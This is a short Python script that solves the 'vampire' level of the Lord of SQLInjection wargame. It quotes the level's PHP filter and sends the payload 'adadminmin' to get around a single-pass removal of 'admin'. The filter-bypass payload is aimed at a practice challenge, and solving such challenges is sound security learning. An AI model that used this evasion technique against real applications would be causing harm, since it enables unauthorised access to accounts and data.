#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    """
    Vampire

    if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
    $_GET[id] = strtolower($_GET[id]);
    $_GET[id] = str_replace("admin","",$_GET[id]);
    $query = "select id from prob_vampire where id='{$_GET[id]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id'] == 'admin') solve("vampire");
    """

    url = "https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'id'
    payload = "adadminmin"

    p = los.SqlInjection(url, cook, method, inj_param, payload)
    response = p.my_request()

    if 'Clear!' in response:
        print('\nVAMPIRE Clear!')


if __name__ == '__main__':
    main()
